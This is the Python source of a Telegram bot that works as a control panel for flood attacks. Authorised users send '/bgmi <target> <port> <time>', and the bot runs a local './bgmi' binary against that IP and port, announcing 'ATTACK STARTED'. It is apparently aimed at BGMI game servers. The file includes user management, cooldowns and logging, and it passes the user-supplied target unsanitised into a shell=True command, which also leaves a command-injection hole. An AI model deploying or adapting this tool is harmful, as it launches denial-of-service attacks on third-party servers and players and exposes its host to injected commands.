#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('YOUR_BOT_TOKEN')

# Admin user IDs
admin_id = ["903402682", "1027596128"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = "UserID: {}".format(user_id)
    
    with open(LOG_FILE, "a") as file:
        file.write("Username: {}\nTarget: {}\nPort: {}\nTime: {}\n\n".format(username, target, port, time))


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = "UserID: {} | Time: {} | Command: {}".format(user_id, datetime.datetime.now(), command)
    if target:
        log_entry += " | Target: {}".format(target)
    if port:
        log_entry += " | Port: {}".format(port)
    if time:
        log_entry += " | Time: {}".format(time)
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write("{}\n".format(user_to_add))
                response = "User {} Added Successfully 👍.".format(user_to_add)
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write("{}\n".format(user_id))
                response = "User {} removed successfully 👍.".format(user_to_remove)
            else:
                response = "User {} not found in the list ❌.".format(user_to_remove)
        else:
            response = "Please Specify A User ID to Remove. \n✅ Usage: /remove <userid>"
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += "- @{} (ID: {})\n".format(username, user_id)
                        except Exception as e:
                            response += "- User ID: {}\n".format(user_id)
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command 😡."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = "🤖Your ID: {}".format(user_id)
    bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = "{} 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {}\n𝐏𝐨𝐫𝐭: {}\n𝐓𝐢𝐦𝐞: {} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI".format(username, target, port, time)
    bot.reply_to(message, response)


# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 0


@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 180:
                response = "Error: Time interval must be less than 180."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = "./bgmi {} {} {}".format(target, port, time)
                subprocess.run(full_command, shell=True)
                response = "BGMI Attack Finished. Target: {} Port: {} Time: {}".format(target, port, time)
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."

    bot.reply_to(message, response)


@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if "UserID: {}".format(user_id) in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "You have no logs yet ❌."
        except FileNotFoundError:
            response = "No logs found ❌."
    else:
        response = "You are not authorized to view logs ❌."

    bot.reply_to(message, response)


# Start the bot
bot.polling()
